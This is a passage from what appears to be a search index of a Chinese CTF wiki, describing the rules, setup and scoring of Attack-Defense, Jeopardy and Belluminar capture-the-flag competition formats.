10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002\n\n\n\u8d5b\u5236\u603b\u8bc4\n\n\n\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge\n\u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002\n\n\n\u653b\u9632\u6a21\u5f0f - Attack \n Defense\n\n\n\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u5728\u7f51\u7edc\u7a7a\u95f4\u4e92\u76f8\u8fdb\u884c\u653b\u51fb\u548c\u9632\u5b88\uff0c\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u6765\u5f97\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4e0d\u8bbe\u7f6e\u5f97\u5206\uff0c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002\u653b\u9632\u6a21\u5f0f\nCTF \u8d5b\u5236\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed\n48 \u5c0f\u65f6\u53ca\u4ee5\u4e0a\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002\n\n\n\u63a5\u4e0b\u6765\u8bb2\u8bb2\u653b\u9632\u6a21\u5f0f\u7684\u5177\u4f53\u60c5\u51b5\uff1a\n\n\n\u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u7ea6\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u534a\u5c0f\u65f6\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002\n\n\n\u9996\u5148\u9700\u8981\u63a5\u5165\u6bd4\u8d5b\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u4e0e\u7f51\u7ebf\u63a5\u53e3\u8f6c\u6362\u5668\uff08\u6bd4\u5982 Mac \u7535\u8111\u9700\u8981\u4f7f\u7528\uff0c\u5982\u679c\u4e3b\u529e\u65b9\u6ca1\u6709\u63d0\u4f9b\u7684\u8bdd\uff0c\u90a3\u5c31\u9700\u8981\u4f60\u81ea\u5907\u4e86\u3002\u5b58\u5728\u6b64\u95ee\u9898\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0b\uff09\u3002\u6587\u6863\u4e0a\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8fde\u63a5\u9700\u8981\u586b\u5199\u7684 \nIP\n\u5730\u5740\u3001\u7f51\u5173\u3001\u63a9\u7801\u3001DNS \u670d\u52a1\u5668\u5730\u5740\n \u7528\u4e8e\u8fde\u63a5\u7f51\u7edc\u3002\n\n\n\u6587\u6863\u4e0a\u4f1a\u660e\u786e\u7ed9\u51fa \n\u53c2\u8d5b\u961f\u4f0d\u6240\u5728 IP \u7f51\u6bb5\n \u3001 \n\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0\n \u3001 \n\u5df1\u65b9 Gamebox \u7684 IP \u5730\u5740\n \u3001 \n\u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801\n \u4ee5\u53ca \n\u654c\u65b9 Gamebox \u6240\u5728 IP \u7f51\u6bb5\n \u3002\n\n\n\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \n\u7f51\u7edc\u62d3\u6251\u56fe\n \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 \nGamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09\n \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002\u53c2\u8d5b\u961f\u4f0d\u4f7f\u7528\u6587\u6863\u63d0\u4f9b\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0\u548c Gamebox\u3002\n\n\n\n\n\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002\n\n\n\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u822c\u6bcf\u8f6e\u5927\u7ea6\u662f 3 - 5\n\u5206\u949f\u65f6\u95f4\u3002\u4f60\u9700\u8981\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u5230\u7b54\u9898\u5e73\u53f0\uff08\u624b\u52a8\u63d0\u4ea4\u4e5f\u884c\uff09\u4e0a\u5f97\u5206\u3002\u6bcf\u652f\u961f\u4f0d\u90fd\u4f1a\u6709\u4e00\u5b9a\u7684\u521d\u59cb\u5f97\u5206\uff08\u4e00\u822c\u521d\u59cb\u5f97\u5206\u76f8\u540c\uff0c\u5982\u679c\u8d5b\u524d\u4f1a\u76f8\u5e94\u8003\u6838\uff0c\u90a3\u4e48\u4f1a\u6839\u636e\u8d5b\u524d\u8003\u6838\u6210\u7ee9\u8bbe\u7f6e\u653b\u9632\u8d5b\u7684\u521d\u59cb\u5f97\u5206\uff09Gamebox \u72b6\u6001\u5206\u4e3a\u4e09\u79cd\uff0c\n\n\u6b63\u5e38\u3001\u653b\u9677\u3001\u4e0d\u53ef\u7528\n \u3002Gamebox \u4e2d\u7684 flag \u4e5f\u4f1a\u6bcf\u8f6e\u8fdb\u884c\u5237\u65b0\u3002\n\n\n\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u6709\u88c1\u5224\u7cfb\u7edf\u6bcf\u8f6e\u90fd\u4f1a\u8fdb\u884c\u8bc4\u5b9a\u3002\n\n\n\n\n\u5982\u679c\u4e00\u8f6e\u8fc7\u53bb\uff0cGamebox \u8868\u73b0\u6b63\u5e38\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u6839\u636e\u672c\u8f6e\u672a\u88ab\u653b\u9677\u7684 Gamebox \u60c5\u51b5\u7ed9\u4e88\u9632\u5fa1\u5f97\u5206\n\n\n\u5982\u679c\u9632\u5fa1\u8fc7\u4e8e\u4e25\u683c\uff0c\u65e0\u6cd5\u901a\u8fc7\u88c1\u5224\u7cfb\u7edf\u7684 \n\u6f0f\u6d1e\u670d\u52a1\u53ef\u7528\u6027\u5224\u5b9a\n \u7684\u8bdd\uff0c\u8be5\u8f6e\u4f1a\u88ab\u88c1\u5224\u7cfb\u7edf\u8ba4\u5b9a\u4e3a\u8be5 Gamebox \u4e0d\u53ef\u7528\uff08\u89c6\u4e3a\u5b95\u673a\uff09\u3002\u672c\u8f6e\u76f4\u63a5\u5931\u5206\u3002\n\n\n\u5982\u679c Gamebox \u88ab\u653b\u9677\uff08\u6709\u961f\u4f0d\u63d0\u4ea4\u4e86\u4f60\u4eec\u961f Gamebox \u4e0a\u968f\u673a\u751f\u6210\u7684 flag\uff09\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u7ed9\u4e88\u8be5\u961f\u653b\u51fb\u5f97\u5206\u3002\n\n\n\u4e00\u8f6e\u4e0b\u6765\uff0c\u7531\u6210\u529f\u653b\u9677\u8be5 Gamebox \u7684\u961f\u4f0d\u5e73\u5206\u653b\u9677\u5f97\u5206\u3002\n\n\n\n\n\u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \n\u4e0b\u5348\u4f1a\u6362\u65b0\u9898\n \u3002", 
            "title": "CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb"
        }, 
        {
            "location": "/introduction/mode/#-jeopardy", 
            "text": "\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM\n\u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002  \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e  \u4e00\u8840  \u3001  \u4e8c\u8840  \u3001  \u4e09\u8840  \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002  \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002  \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b  Web \u7f51\u7edc\u653b\u9632  \u3001  RE \u9006\u5411\u5de5\u7a0b  \u3001  Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528  \u3001  Crypto \u5bc6\u7801\u653b\u51fb  \u3001  Mobile \u79fb\u52a8\u5b89\u5168  \u4ee5\u53ca  Misc \u5b89\u5168\u6742\u9879  \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002", 
            "title": "\u89e3\u9898\u6a21\u5f0f - Jeopardy"
        }, 
        {
            "location": "/introduction/mode/#-belluminar", 
            "text": "\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016\n\u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002  \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a  http://belluminar.org/", 
            "title": "\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar"
        }, 
        {
            "location": "/introduction/mode/#_1", 
            "text": "Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of\nfestival consisted of CTF   seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can\ndefend what others want to attack.   \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002", 
            "title": "\u8d5b\u5236\u4ecb\u7ecd"
        }, 
        {
            "location": "/introduction/mode/#_2", 
            "text": "Each team is required to submit 2 challenges to the challenge bank of the sponsor.   \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002   Challenge 1: must be on the Linux platform;  Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)   \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002  \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a\n200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002", 
            "title": "\u51fa\u9898\u9636\u6bb5"
        }, 
        {
            "location": "/introduction/mode/#_3", 
            "text": "\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup\n\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002  \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002", 
            "title": "\u63d0\u4ea4\u90e8\u7f72"
        }, 
        {
            "location": "/introduction/mode/#_4", 
            "text": "\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002", 
            "title": "\u89e3\u9898\u7ade\u6280"
        }, 
        {
            "location": "/introduction/mode/#_5", 
            "text": "\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2\n\u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002", 
            "title": "\u5206\u4eab\u8ba8\u8bba"
        }, 
        {
            "location": "/introduction/mode/#_6", 
            "text": "\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N\n\u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002  \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002  \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002", 
            "title": "\u8ba1\u5206\u89c4\u5219"
        }, 
        {
            "location": "/introduction/mode/#_7", 
            "text": "\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge\n\u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002", 
            "title": "\u8d5b\u5236\u603b\u8bc4"
        }, 
        {
            "location": "/introduction/mode/#-attack-defense", 
            "text": "\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u5728\u7f51\u7edc\u7a7a\u95f4\u4e92\u76f8\u8fdb\u884c\u653b\u51fb\u548c\u9632\u5b88\uff0c\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u6765\u5f97\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4e0d\u8bbe\u7f6e\u5f97\u5206\uff0c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002\u653b\u9632\u6a21\u5f0f\nCTF 